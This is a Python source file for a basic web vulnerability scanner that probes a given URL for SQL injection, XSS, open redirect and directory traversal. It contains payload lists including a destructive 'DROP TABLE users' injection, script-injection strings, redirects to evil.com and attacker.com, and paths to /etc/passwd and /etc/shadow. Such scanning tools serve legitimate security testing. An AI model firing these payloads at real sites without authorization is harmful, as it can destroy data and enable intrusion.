#!/usr/bin/env python3
"""
╔═══════════════════════════════════════════════════════╗
║          Web Vulnerability Scanner v1.0               ║
║  Detects: SQLi | XSS | Open Redirect | Dir Traversal  ║
║  Author  : R0hit324                                    ║
╚═══════════════════════════════════════════════════════╝
"""

import requests
import sys
import os
import time
from datetime import datetime
from urllib.parse import urlparse, urljoin, parse_qs, urlencode, urlunparse
from bs4 import BeautifulSoup

# ─────────────────────────────────────────────
#  COLORS (terminal)
# ─────────────────────────────────────────────
RED    = "\033[91m"
GREEN  = "\033[92m"
YELLOW = "\033[93m"
CYAN   = "\033[96m"
BOLD   = "\033[1m"
RESET  = "\033[0m"

# ─────────────────────────────────────────────
#  PAYLOADS
# ─────────────────────────────────────────────
SQLI_PAYLOADS = [
    "'", '"', "' OR '1'='1", "' OR 1=1--",
    "\" OR \"1\"=\"1", "' OR 'x'='x",
    "1' ORDER BY 1--", "1 UNION SELECT NULL--",
    "' AND SLEEP(2)--", "'; DROP TABLE users--"
]

XSS_PAYLOADS = [
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert('XSS')>",
    "'\"><script>alert(1)</script>",
    "<svg/onload=alert('XSS')>",
    "javascript:alert('XSS')",
    "<body onload=alert('XSS')>",
    "\"><img src=x onerror=alert(1)>"
]

REDIRECT_PAYLOADS = [
    "https://evil.com",
    "//evil.com",
    "http://google.com",
    "//google.com/%2F..",
    "https://attacker.com/phish"
]

TRAVERSAL_PAYLOADS = [
    "../../../../etc/passwd",
    "../../../../windows/win.ini",
    "../../../etc/shadow",
    "..%2F..%2F..%2Fetc%2Fpasswd",
    "%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "....//....//etc/passwd"
]

TRAVERSAL_SIGNATURES = [
    "root:x:", "[extensions]", "daemon:", "bin/bash",
    "nobody:", "shadow", "www-data"
]

SQLI_ERRORS = [
    "sql syntax", "mysql_fetch", "ora-", "syntax error",
    "unclosed quotation", "quoted string not properly terminated",
    "microsoft ole db", "odbc sql server driver", "sqlite_",
    "pg_query", "postgresql", "warning: mysql"
]

# ─────────────────────────────────────────────
#  LOGGER
# ─────────────────────────────────────────────
class Logger:
    def __init__(self, filename):
        self.filename = filename
        self._write_header()

    def _write_header(self):
        header = (
            "=" * 60 + "\n"
            "       WEB VULNERABILITY SCANNER REPORT\n"
            f"       Scan Date : {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
            "=" * 60 + "\n"
        )
        with open(self.filename, "w") as f:
            f.write(header)

    def log(self, msg, color="", file_msg=None):
        print(f"{color}{msg}{RESET}" if color else msg)
        clean = file_msg if file_msg else msg
        with open(self.filename, "a") as f:
            f.write(clean + "\n")

    def section(self, title):
        line = f"\n{'─'*50}\n  {title}\n{'─'*50}"
        self.log(line, CYAN)

    def vuln(self, msg):
        self.log(f"  [VULNERABLE] {msg}", RED)

    def safe(self, msg):
        self.log(f"  [SAFE]       {msg}", GREEN)

    def info(self, msg):
        self.log(f"  [INFO]       {msg}", YELLOW)


# ─────────────────────────────────────────────
#  HELPERS
# ─────────────────────────────────────────────
def inject_url_params(url, payload):
    parsed = urlparse(url)
    params = parse_qs(parsed.query)
    if not params:
        return None
    injected_urls = []
    for key in params:
        new_params = dict(params)
        new_params[key] = [payload]
        flat = {k: v[0] for k, v in new_params.items()}
        new_query = urlencode(flat)
        new_url = urlunparse(parsed._replace(query=new_query))
        injected_urls.append((key, new_url))
    return injected_urls


def get_forms(url, session):
    try:
        r = session.get(url, timeout=10)
        soup = BeautifulSoup(r.content, "html.parser")
        return soup.find_all("form")
    except Exception:
        return []


def submit_form(form, url, payload, session):
    action = form.attrs.get("action", "")
    method = form.attrs.get("method", "get").lower()
    target = urljoin(url, action)
    data = {}
    for tag in form.find_all(["input", "textarea"]):
        name = tag.attrs.get("name")
        if not name:
            continue
        data[name] = payload
    try:
        if method == "post":
            return session.post(target, data=data, timeout=10)
        else:
            return session.get(target, params=data, timeout=10)
    except Exception:
        return None


# ─────────────────────────────────────────────
#  SCANNER MODULES
# ─────────────────────────────────────────────
def scan_sqli(url, logger, session):
    logger.section("SQL INJECTION SCAN")
    found_any = False

    for payload in SQLI_PAYLOADS:
        injected = inject_url_params(url, payload)
        if injected:
            for param, injected_url in injected:
                try:
                    r = session.get(injected_url, timeout=10)
                    body = r.text.lower()
                    for err in SQLI_ERRORS:
                        if err in body:
                            logger.vuln(f"SQLi in param '{param}' | Payload: {payload}")
                            logger.vuln(f"  URL: {injected_url}")
                            found_any = True
                            break
                except Exception:
                    pass

    forms = get_forms(url, session)
    for i, form in enumerate(forms):
        for payload in SQLI_PAYLOADS:
            r = submit_form(form, url, payload, session)
            if r:
                body = r.text.lower()
                for err in SQLI_ERRORS:
                    if err in body:
                        logger.vuln(f"SQLi in form #{i+1} | Payload: {payload}")
                        found_any = True
                        break

    if not found_any:
        logger.safe("No SQL Injection vulnerabilities detected.")


def scan_xss(url, logger, session):
    logger.section("XSS (Cross-Site Scripting) SCAN")
    found_any = False

    for payload in XSS_PAYLOADS:
        injected = inject_url_params(url, payload)
        if injected:
            for param, injected_url in injected:
                try:
                    r = session.get(injected_url, timeout=10)
                    if payload in r.text:
                        logger.vuln(f"XSS in param '{param}' | Payload: {payload}")
                        logger.vuln(f"  URL: {injected_url}")
                        found_any = True
                except Exception:
                    pass

    forms = get_forms(url, session)
    for i, form in enumerate(forms):
        for payload in XSS_PAYLOADS:
            r = submit_form(form, url, payload, session)
            if r and payload in r.text:
                logger.vuln(f"XSS in form #{i+1} | Payload: {payload}")
                found_any = True
                break

    if not found_any:
        logger.safe("No XSS vulnerabilities detected.")


def scan_open_redirect(url, logger, session):
    logger.section("OPEN REDIRECT SCAN")
    found_any = False

    redirect_params = ["url", "redirect", "next", "return",
                       "returnUrl", "goto", "dest", "destination", "continue"]
    parsed = urlparse(url)
    base = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"

    for param in redirect_params:
        for payload in REDIRECT_PAYLOADS:
            test_url = f"{base}?{param}={payload}"
            try:
                r = session.get(test_url, timeout=10, allow_redirects=False)
                location = r.headers.get("Location", "")
                if any(p in location for p in ["evil.com", "google.com", "attacker.com"]):
                    logger.vuln(f"Open Redirect via param '{param}' -> {location}")
                    logger.vuln(f"  URL: {test_url}")
                    found_any = True
            except Exception:
                pass

    if not found_any:
        logger.safe("No Open Redirect vulnerabilities detected.")


def scan_directory_traversal(url, logger, session):
    logger.section("DIRECTORY TRAVERSAL SCAN")
    found_any = False

    for payload in TRAVERSAL_PAYLOADS:
        injected = inject_url_params(url, payload)
        if injected:
            for param, injected_url in injected:
                try:
                    r = session.get(injected_url, timeout=10)
                    for sig in TRAVERSAL_SIGNATURES:
                        if sig in r.text:
                            logger.vuln(f"Dir Traversal in param '{param}' | Payload: {payload}")
                            logger.vuln(f"  Matched: '{sig}' in response")
                            found_any = True
                            break
                except Exception:
                    pass

    file_params = ["file", "path", "page", "include", "doc", "view", "load"]
    parsed = urlparse(url)
    base = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"

    for param in file_params:
        for payload in TRAVERSAL_PAYLOADS:
            test_url = f"{base}?{param}={payload}"
            try:
                r = session.get(test_url, timeout=10)
                for sig in TRAVERSAL_SIGNATURES:
                    if sig in r.text:
                        logger.vuln(f"Dir Traversal via param '{param}' | Payload: {payload}")
                        found_any = True
                        break
            except Exception:
                pass

    if not found_any:
        logger.safe("No Directory Traversal vulnerabilities detected.")


# ─────────────────────────────────────────────
#  MAIN
# ─────────────────────────────────────────────
def print_banner():
    print(f"""
{CYAN}{BOLD}
╔═══════════════════════════════════════════════════════╗
║          Web Vulnerability Scanner v1.0               ║
║  Detects: SQLi | XSS | Open Redirect | Dir Traversal  ║
║  Author  : R0hit324                                    ║
╚═══════════════════════════════════════════════════════╝
{RESET}""")


def main():
    print_banner()

    if len(sys.argv) > 1:
        target = sys.argv[1]
    else:
        target = input(f"{YELLOW}[?] Enter target URL (e.g. http://testphp.vulnweb.com): {RESET}").strip()

    if not target.startswith("http"):
        target = "http://" + target

    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    domain = urlparse(target).netloc.replace(".", "_")
    report_file = f"report_{domain}_{timestamp}.txt"

    logger = Logger(report_file)

    logger.log(f"\n  Target  : {target}", BOLD)
    logger.log(f"  Report  : {report_file}", BOLD)
    logger.log(f"  Started : {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n", BOLD)

    session = requests.Session()
    session.headers.update({"User-Agent": "Mozilla/5.0 (WebVulnScanner/1.0)"})

    try:
        r = session.get(target, timeout=10)
        logger.info(f"Target reachable | Status: {r.status_code}")
    except Exception as e:
        print(f"\n{RED}[ERROR] Cannot reach target: {e}{RESET}")
        sys.exit(1)

    start = time.time()

    scan_sqli(target, logger, session)
    scan_xss(target, logger, session)
    scan_open_redirect(target, logger, session)
    scan_directory_traversal(target, logger, session)

    elapsed = round(time.time() - start, 2)

    footer = f"""
{'='*60}
  Scan Complete
  Time Taken : {elapsed} seconds
  Report     : {report_file}
{'='*60}
"""
    logger.log(footer, CYAN)


if __name__ == "__main__":
    main()
